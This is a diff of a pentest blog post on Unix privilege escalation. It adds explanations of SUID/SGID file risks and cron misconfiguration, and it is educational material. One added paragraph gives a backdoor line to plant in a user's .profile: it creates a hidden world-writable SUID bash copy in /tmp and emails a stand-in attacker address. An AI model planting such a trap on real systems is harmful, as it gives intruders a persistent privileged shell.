@@ -5,7 +5,7 @@ date:   2018-09-27 09:00:00
 categories: System Pentest
 author: Antoine Brunet
 permalink: unix-privilege-escalation.html
-article_folder: "/tor-middle-box"
+article_folder: ""
 comments: true
 description: ""
 keywords: ""
@@ -207,11 +207,25 @@ Here some example of command you can use for escalade your privileges.
 
 ## File permission
 
-- SUID SGID
-
 ### File permission overview
 
+It is really important to be careful with file permission. There is few possibilities to realized a privilege escalation with misconfigured file permission.
+
+First if you let the read access of a sensitive file like a private key, or a script running as daemon or in the cron.
+
+SUID (Set User ID) or SGID (Set Group ID) files must be as mutch as possible avoided.
+They are needed for tasks that require higher privileges than those which common users have, such as `passwd` command.
+
+```
+ls -la /usr/bin/passwd
+-rwsr-xr-x 1 root root 47032 May 16  2017 /usr/bin/passwd
+```
+
+Attacker can put some traps like this one: adding to the `.profile` of a user this line: `cp /bin/bash /tmp/.hiddenShell && chmod 4777 /tmp/.hiddenShell && mail –s "Shell done" attacker@badguy.co`. This will create a hidden shell `/tmp/.hiddenShell` with the SUID activate and the read, write, an execution rights to all users, finally it will send an email to the attacker. There is plenty of different traps that can be done this one is only a quick example but the imagination is the only limit.
+
 ### File permission information gathering
+
+Some basic command to collect some clue for realized a privilege escalation abusing file permission.
 
 | Command                | Result                            |
 | :-------------------- | :------------------------------- |
@@ -230,13 +244,17 @@ Here some example of command you can use for escalade your privileges.
 
 ## Cron
 
-- Path
-- Wildcard
-- File Overwrite
-
-Have a look on this article [Unix Wildcards Gone Wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
-
 ### Cron privilege escalation overview
+
+The cron daemon schedules commands to be run at specified dates and times.
+It run commands with specific users. So we can try to abuse it for realise a privilege escalation.
+
+A good way to abuse the cron, is to check the file permissions of the scripts it run.
+If the permissions are not well set, an attacker can possibility overwrite the file and easily get the privilege of the user set in the cron.
+
+An other way is to use the wildcard tricks which are well explained in this article [Unix Wildcards Gone Wild](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
+
+Finally, always use the full path for each commands and scripts you run.
 
 ### Cron information gathering
 
